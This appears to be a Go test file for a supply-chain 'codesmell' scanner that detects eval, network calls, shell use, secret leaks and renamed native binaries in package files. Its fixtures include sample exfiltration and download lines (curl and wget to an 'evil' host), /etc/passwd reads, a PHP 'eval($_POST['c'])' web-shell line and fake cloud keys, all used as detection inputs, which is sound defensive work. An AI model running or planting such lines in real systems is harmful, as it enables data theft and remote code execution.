package codesmell

import (
	"bytes"
	"fmt"
	"strings"
	"testing"
)

func TestScanEvalJSFires(t *testing.T) {
	files := map[string][]byte{
		"malice.js": []byte(`var x = eval("1+1"); var f = new Function("return 1");`),
	}
	r := ScanEval(files)
	// Per-file fast path returns Fired plus one hit (first kind); the
	// policy gate only reads Fired. A multi-file archive can still
	// accumulate multiple matches.
	if !r.Fired || r.Hits < 1 {
		t.Fatalf("expected >=1 eval hit, got %+v", r)
	}
}

func TestScanEvalPython(t *testing.T) {
	files := map[string][]byte{
		"a.py": []byte("import os\nx = eval('1+1')\nexec(compile('pass', '<x>', 'exec'))\n"),
	}
	r := ScanEval(files)
	if !r.Fired {
		t.Fatalf("expected eval fire, got %+v", r)
	}
}

func TestScanEvalGoSkipped(t *testing.T) {
	files := map[string][]byte{
		"x.go": []byte("package main\nfunc eval() { }\n"),
	}
	// Go language has no eval rules; no hit.
	r := ScanEval(files)
	if r.Fired {
		t.Fatalf("go should not fire UsesEval, got %+v", r)
	}
}

func TestScanNetwork(t *testing.T) {
	files := map[string][]byte{
		"x.js":  []byte(`fetch("https://evil")`),
		"x.py":  []byte("import urllib\nimport requests\nrequests.get('https://evil')"),
		"x.go":  []byte("package x\nimport \"net/http\"\nvar _ = http.Get"),
		"x.rs":  []byte("use reqwest::Client;"),
		"x.rb":  []byte("require 'net/http'"),
		"x.php": []byte("<?php curl_init(); ?>"),
	}
	r := ScanNetwork(files)
	// One hit per file under the fast-path driver; the test seeds 6 files.
	if !r.Fired || r.Hits < 4 {
		t.Fatalf("expected cross-lang network hits, got %+v", r)
	}
}

func TestScanShell(t *testing.T) {
	files := map[string][]byte{
		"x.js": []byte(`const cp = require("child_process"); cp.exec("ls")`),
		"x.py": []byte("import subprocess\nsubprocess.run(['ls'])\nimport os\nos.system('id')\n"),
		"x.rb": []byte("system('ls')"),
		"x.go": []byte(`package x; import "os/exec"; var _ = exec.Command`),
	}
	r := ScanShell(files)
	if !r.Fired || r.Hits < 3 {
		// 4 files seeded, expect at least 3 (one per file).
		t.Fatalf("expected shell hits, got %+v", r)
	}
}

func TestScanFilesystem(t *testing.T) {
	files := map[string][]byte{
		"a.py": []byte("open('/etc/passwd')"),
		"a.js": []byte(`const fs = require("fs"); fs.readFile("/etc/passwd");`),
		"a.go": []byte(`package a; import "os"; var _ = os.Open`),
	}
	r := ScanFilesystem(files)
	if !r.Fired || r.Hits < 3 {
		t.Fatalf("expected fs hits, got %+v", r)
	}
}

func TestScanEnvVars(t *testing.T) {
	files := map[string][]byte{
		"a.py": []byte("import os\nprint(os.environ['HOME'])"),
		"a.js": []byte("console.log(process.env.SECRET)"),
		"a.go": []byte(`package a; import "os"; func f() { os.Getenv("X") }`),
		"a.rb": []byte("puts ENV['PATH']"),
	}
	r := ScanEnvVars(files)
	if !r.Fired || r.Hits < 4 {
		t.Fatalf("expected env hits, got %+v", r)
	}
}

func TestScanNativeBinary(t *testing.T) {
	files := map[string][]byte{
		"addon.node":    []byte{0},
		"build/libx.so": []byte{0},
		"win/x.dll":     []byte{0},
		"ios/x.dylib":   []byte{0},
		"binding.gyp":   []byte("{}"),
		"src/main.rs":   []byte("fn main(){}"), // should NOT fire
		"README.md":     []byte("hi"),
	}
	r := ScanNativeBinary(files)
	if !r.Fired || r.Hits < 5 {
		t.Fatalf("expected binary hits, got %+v", r)
	}
}

func TestScanNativeBinaryEmpty(t *testing.T) {
	if ScanNativeBinary(nil).Fired {
		t.Fatal("nil map should not fire")
	}
	if ScanNativeBinary(map[string][]byte{"src/main.rs": []byte("fn main(){}")}).Fired {
		t.Fatal("pure source should not fire")
	}
}

func TestScanMinifiedFires(t *testing.T) {
	// Construct a single-line JS blob with lots of short identifiers.
	var buf bytes.Buffer
	for i := 0; i < 300; i++ {
		buf.WriteString("a=b+c;d=e+f;g=h+i;j=k+l;")
	}
	files := map[string][]byte{"bundle.js": buf.Bytes()}
	r := ScanMinified(files)
	if !r.Fired {
		t.Fatalf("expected minified fire, got %+v", r)
	}
}

func TestScanMinifiedPrettyDoesNotFire(t *testing.T) {
	pretty := `function hello(name) {
  return "Hello, " + name + "!";
}
`
	files := map[string][]byte{"ok.js": []byte(strings.Repeat(pretty, 20))}
	if ScanMinified(files).Fired {
		t.Fatal("pretty source must not fire MinifiedCode")
	}
}

func TestScanURLsFires(t *testing.T) {
	files := map[string][]byte{
		"x.js":      []byte(`fetch("http://evil.example.com/exfil")`),
		"README.md": []byte("See https://example.com for docs."), // doc allowlist
	}
	r := ScanURLs(files)
	if !r.Fired || r.Hits != 1 {
		t.Fatalf("expected 1 URL hit outside README, got %+v", r)
	}
}

func TestScanURLsSkipsManifestFiles(t *testing.T) {
	files := map[string][]byte{
		"package.json": []byte(`{"homepage": "https://github.com/x/y"}`),
	}
	if ScanURLs(files).Fired {
		t.Fatal("package.json homepage must not fire URLStrings")
	}
}

func TestScanEntropyAWS(t *testing.T) {
	files := map[string][]byte{
		"leak.py": []byte(`AWS_KEY = "AKIAIOSFODNN7EXAMPLE"` + "\n" +
			`aws_secret_access_key = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"` + "\n"),
	}
	r := ScanEntropy(files)
	if !r.Fired || r.Hits < 2 {
		t.Fatalf("expected AWS leak hits, got %+v", r)
	}
}

func TestScanEntropyGithub(t *testing.T) {
	files := map[string][]byte{
		"leak.go": []byte(`token := "ghp_abcdefghijABCDEFGHIJabcdefghij123456"`),
	}
	r := ScanEntropy(files)
	if !r.Fired {
		t.Fatalf("expected github-pat hit, got %+v", r)
	}
}

func TestScanEntropyLowEntropySkipped(t *testing.T) {
	// Fake generic-high-entropy line that fails the entropy floor.
	files := map[string][]byte{
		"a.py": []byte(`password = "aaaaaaaaaaaaaaaaaaaaaaaaaa"`),
	}
	r := ScanEntropy(files)
	if r.Fired {
		t.Fatalf("low-entropy string should not fire, got %+v", r)
	}
}

func TestShannonEntropyEmpty(t *testing.T) {
	if shannonEntropy("") != 0 {
		t.Fatal("empty input should be 0 entropy")
	}
	if shannonEntropy("aaaa") != 0 {
		t.Fatal("uniform input should be 0 entropy")
	}
	if shannonEntropy("ab") <= 0 {
		t.Fatal("varied input should be >0 entropy")
	}
}

func TestDetectLanguage(t *testing.T) {
	cases := map[string]Language{
		"x.js":        LangJS,
		"x.tsx":       LangJS,
		"a.py":        LangPython,
		"b.rb":        LangRuby,
		"c.go":        LangGo,
		"d.rs":        LangRust,
		"e.php":       LangPHP,
		"f.java":      LangJava,
		"g.cs":        LangCSharp,
		"unknown.xyz": LangUnknown,
	}
	for name, want := range cases {
		if got := detectLanguage(name); got != want {
			t.Errorf("detectLanguage(%q) = %d, want %d", name, got, want)
		}
	}
}

func TestResultCap(t *testing.T) {
	// Verify addMatch increments Hits past the match cap.
	var r Result
	for i := 0; i < MaxMatchesPerResult*3; i++ {
		r.addMatch(Match{Path: "x"})
	}
	if len(r.Matches) != MaxMatchesPerResult {
		t.Fatalf("matches cap: got %d", len(r.Matches))
	}
	if r.Hits != MaxMatchesPerResult*3 {
		t.Fatalf("hits should count all: got %d", r.Hits)
	}
}

func TestSnippetAtAndLineOf(t *testing.T) {
	body := []byte("alpha\nbeta\ngamma\n")
	if got := lineOf(body, 0); got != 1 {
		t.Errorf("line 0 = %d, want 1", got)
	}
	if got := lineOf(body, 7); got != 2 {
		t.Errorf("line 7 = %d, want 2", got)
	}
	if got := snippetAt(body, 6); got != "beta" {
		t.Errorf("snippet = %q", got)
	}
}

func TestIterFilesCaps(t *testing.T) {
	files := make(map[string][]byte)
	for i := 0; i < MaxFilesPerScan+10; i++ {
		files[string(rune('a'+(i%26)))+"_"+string(rune('a'+(i%13)))+"_"+itoa(i)+".js"] = []byte("x=1")
	}
	var visited int
	iterFiles(files, func(name string, body []byte, lang Language) bool {
		visited++
		return true
	})
	// visited is bounded; note that iterFiles increments visited before
	// skipping unknown-lang files, but these are all .js so all counted.
	if visited > MaxFilesPerScan {
		t.Errorf("iterFiles did not cap: %d", visited)
	}
}

// itoa is a tiny helper so the test compiles without importing strconv.
func itoa(i int) string {
	if i == 0 {
		return "0"
	}
	var buf [20]byte
	pos := len(buf)
	for i > 0 {
		pos--
		buf[pos] = byte('0' + i%10)
		i /= 10
	}
	return string(buf[pos:])
}

// --- New eval-rule coverage: deferred-eval forms -----------------------

func TestScanEvalJSSetTimeoutString(t *testing.T) {
	files := map[string][]byte{
		"x.js": []byte(`setTimeout("alert(1)", 100); setInterval('do()', 50)`),
	}
	r := ScanEval(files)
	if !r.Fired {
		t.Fatalf("expected setTimeout/setInterval-with-string fire, got %+v", r)
	}
}

func TestScanEvalJSSetTimeoutFunctionDoesNotFire(t *testing.T) {
	// Function-arg form is the safe pattern; we must NOT match it.
	files := map[string][]byte{
		"x.js": []byte(`setTimeout(function(){doStuff()}, 100); setInterval(handler, 50)`),
	}
	if ScanEval(files).Fired {
		t.Fatal("function-arg setTimeout/setInterval must not fire UsesEval")
	}
}

// Python method calls named like the builtins are not eval: re.compile was
// the whole hit on most PyPI packages this fired on.
func TestScanEvalPythonMethodsAreNotBuiltins(t *testing.T) {
	files := map[string][]byte{
		"kafka/consumer/subscription_state.py": []byte("import re\nTOPIC_LEGAL_CHARS = re.compile('^[a-zA-Z0-9._-]+$')\n" +
			"self.subscribed_pattern = re.compile(pattern)\n"),
		"torchfunc/module.py": []byte("model.eval()\ncursor.exec(sql)\n"),
	}
	if r := ScanEval(files); r.Fired {
		t.Fatalf("method calls fired UsesEval: %+v", r.Matches)
	}
	builtin := map[string][]byte{"setup.py": []byte("exec(compile(open(f).read(), f, 'exec'))\n")}
	if !ScanEval(builtin).Fired {
		t.Fatal("builtin exec(compile(...)) at the start of a line did not fire")
	}
}

func TestScanEvalPythonDunderImport(t *testing.T) {
	files := map[string][]byte{
		"x.py": []byte("mod = __import__('os')\n"),
	}
	r := ScanEval(files)
	if !r.Fired {
		t.Fatalf("expected __import__ fire, got %+v", r)
	}
}

func TestScanEvalPythonRegularImportDoesNotFire(t *testing.T) {
	files := map[string][]byte{
		"x.py": []byte("import os\nfrom sys import path\n"),
	}
	if ScanEval(files).Fired {
		t.Fatal("plain import must not fire UsesEval (not __import__)")
	}
}

// --- New network-rule coverage: shell-out to curl/wget -----------------

func TestScanNetworkJSExecCurl(t *testing.T) {
	files := map[string][]byte{
		"x.js": []byte(`require('child_process').exec("curl https://evil/exfil")`),
	}
	r := ScanNetwork(files)
	if !r.Fired {
		t.Fatalf("expected exec(curl) fire, got %+v", r)
	}
}

func TestScanNetworkPythonSubprocessCurl(t *testing.T) {
	files := map[string][]byte{
		"x.py": []byte(`subprocess.run(["curl", "https://evil/exfil"])`),
	}
	r := ScanNetwork(files)
	if !r.Fired {
		t.Fatalf("expected subprocess(curl) fire, got %+v", r)
	}
}

func TestScanNetworkPythonOsSystemWget(t *testing.T) {
	files := map[string][]byte{
		"x.py": []byte(`os.system("wget -q https://evil/script.sh -O /tmp/x")`),
	}
	r := ScanNetwork(files)
	if !r.Fired {
		t.Fatalf("expected os.system(wget) fire, got %+v", r)
	}
}

func TestScanNetworkPythonShellNoNetwork(t *testing.T) {
	// subprocess to a non-curl/wget command must not fire NetworkAccess.
	// (It might fire ShellAccess separately — that is a different signal.)
	files := map[string][]byte{
		"x.py": []byte(`subprocess.run(["ls", "-la"])` + "\n"),
	}
	if ScanNetwork(files).Fired {
		t.Fatal("subprocess to ls must not fire NetworkAccess")
	}
}

// --- Magic-byte sniff for renamed binaries -----------------------------

func TestDetectBinaryByMagic(t *testing.T) {
	cases := map[string]string{
		"ELF":    "\x7fELFwhatever",
		"Mach-O": "\xfe\xed\xfa\xcfblob",
		"PE":     "MZheader-stuff",
	}
	for want, body := range cases {
		if got := detectBinaryByMagic([]byte(body)); got != want {
			t.Errorf("detectBinaryByMagic(%q) = %q, want %q", want, got, want)
		}
	}
	if got := detectBinaryByMagic([]byte("plain text")); got != "" {
		t.Errorf("plain text should yield empty, got %q", got)
	}
	if got := detectBinaryByMagic([]byte{0, 1, 2}); got != "" {
		t.Errorf("short body should yield empty, got %q", got)
	}
}

func TestScanNativeBinaryFlagsRenamedELF(t *testing.T) {
	// .txt extension with ELF body — extension table miss, magic hit.
	files := map[string][]byte{
		"hidden.txt": []byte("\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00rest"),
		"plain.txt":  []byte("hello world"),
	}
	r := ScanNativeBinary(files)
	if !r.Fired {
		t.Fatalf("expected magic-byte fire on renamed ELF, got %+v", r)
	}
	// Confirm the kind tag carries the magic-discovered shape.
	gotMagic := false
	for _, m := range r.Matches {
		if strings.HasPrefix(m.Kind, "native-binary:") {
			gotMagic = true
			break
		}
	}
	if !gotMagic {
		t.Fatalf("expected a native-binary:<kind> match, got %+v", r.Matches)
	}
}

func TestScanNativeBinaryFlagsRenamedMachO(t *testing.T) {
	files := map[string][]byte{
		"foo.data": []byte("\xcf\xfa\xed\xfe\x07\x00\x00\x01...rest"),
	}
	if !ScanNativeBinary(files).Fired {
		t.Fatal("expected magic-byte fire on renamed Mach-O")
	}
}

// A Makefile is a build script in no particular language.
func TestScanNativeBinaryMakefileAloneIsNotNative(t *testing.T) {
	files := map[string][]byte{
		"github.com/superfly/flyctl@v0.1.136/Makefile": []byte("build:\n\tgo build ./...\n"),
		"github.com/superfly/flyctl@v0.1.136/main.go":  []byte("package main\n"),
	}
	if r := ScanNativeBinary(files); r.Fired {
		t.Fatalf("a Makefile alone was flagged native: %+v", r.Matches)
	}
	if !ScanNativeBinary(map[string][]byte{"package/binding.gyp": []byte("{}")}).Fired {
		t.Fatal("binding.gyp must still flag: node-gyp compiles it at install")
	}
}

func TestScanNativeBinaryFlagsRenamedPE(t *testing.T) {
	files := map[string][]byte{
		"trojan.dat": []byte("MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00rest"),
	}
	if !ScanNativeBinary(files).Fired {
		t.Fatal("expected magic-byte fire on renamed PE")
	}
}

// Only the first URL per file is examined, so a non-http scheme ahead of it
// must not hide an https endpoint.
func TestScanURLsHTTPAfterOtherScheme(t *testing.T) {
	files := map[string][]byte{
		"package/dist/client.js": []byte("// maintainer: mailto:dev@example.org\n" +
			"const base = 'https://api.backblazeb2.com/b2api/v2';\n"),
	}
	r := ScanURLs(files)
	if !r.Fired || r.Matches[0].Snippet != "https://api.backblazeb2.com/b2api/v2" {
		t.Fatalf("https URL after a mailto: was not reported: %+v", r.Matches)
	}
	if ScanURLs(map[string][]byte{"a.js": []byte("// git://example.org/x.git mailto:a@b.c\n")}).Fired {
		t.Fatal("a non-http scheme fired URLStrings")
	}
}

// Past MaxFilesPerScan the scanned subset must be a function of the bytes, not
// of map iteration order: the same artifact gave different answers per scan.
func TestScanSubsetIsDeterministicPastTheFileCap(t *testing.T) {
	files := map[string][]byte{}
	for i := 0; i < MaxFilesPerScan+100; i++ {
		files[fmt.Sprintf("webapp/src/m%04d.php", i)] = []byte("<?php echo 1;\n")
	}
	files["webapp/src/m0000.php"] = []byte("<?php eval($_POST['c']);\n")
	files["webapp/lib/a.bin"] = []byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0}
	for i := 0; i < 50; i++ {
		if !ScanEval(files).Fired {
			t.Fatalf("run %d: the first file in path order was not scanned", i)
		}
	}
	big := map[string][]byte{}
	for i := 0; i < MaxFilesPerScan*4+100; i++ {
		big[fmt.Sprintf("z/%05d.txt", i)] = []byte("x")
	}
	big["a/agent"] = []byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0}
	for i := 0; i < 50; i++ {
		if !ScanNativeBinary(big).Fired {
			t.Fatalf("run %d: native scan skipped the first file in path order", i)
		}
	}
}

// Non-source files must not spend the source budget, and two scans of the
// same >500-file artifact must see the same subset.
func TestIterFilesBudgetIsSourceOnlyAndStable(t *testing.T) {
	files := map[string][]byte{}
	for i := 0; i < MaxFilesPerScan+50; i++ {
		files[fmt.Sprintf("assets/%04d.png", i)] = []byte("\x89PNG")
	}
	for i := 0; i < MaxFilesPerScan+50; i++ {
		files[fmt.Sprintf("src/m%04d.js", i)] = []byte("x=1\n")
	}
	files["src/m0001.js"] = []byte("const s = require('child_process');\n")
	if !ScanShell(files).Fired {
		t.Fatal("non-source files used up MaxFilesPerScan before the code was reached")
	}
	walk := func() []string {
		var seen []string
		iterFiles(files, func(name string, _ []byte, _ Language) bool {
			seen = append(seen, name)
			return true
		})
		return seen
	}
	a, b := walk(), walk()
	if len(a) != MaxFilesPerScan || strings.Join(a, ",") != strings.Join(b, ",") {
		t.Fatalf("subset not stable: %d vs %d files, equal=%v", len(a), len(b), strings.Join(a, ",") == strings.Join(b, ","))
	}
}
